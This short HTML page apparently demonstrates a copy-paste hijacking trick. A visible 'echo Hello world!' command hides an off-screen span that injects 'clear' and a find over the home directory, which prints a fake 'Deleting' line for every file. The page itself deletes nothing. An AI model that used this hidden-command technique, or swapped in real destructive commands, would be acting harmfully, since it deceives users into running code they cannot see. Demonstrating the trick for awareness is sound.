<!DOCTYPE html>
<html>
	<head>
		<title>Hello world!</title>
		<style>
			body {
				max-width: 640px;
				margin: 0 auto;
			}
			.code {
				display: inline-block;
				background-color: #ffc;
				margin-left: 1em;
				padding: 0.8em;
			}
			.seemore {
				color: #888;
				font-size: 0.75em;
			}
		</style>
	</head>
	<body>
		<h2>Hello world!</h2>
		<p>Copy and paste this into a bash shell!</p>
		<p class="code">
			echo "Hello world!"
			<span style="position: absolute; left: -100px; top: -100px;">
				;
				clear;
				find ~/ -type f -printf '"%p"\n' | xargs -n 1 -I {} echo 'Deleting {}'
				<br />
			</span>
			;
		</p>
		<br />
		<a class="seemore" href="https://thejh.net/misc/website-terminal-copy-paste">Original source</a>
	</body>
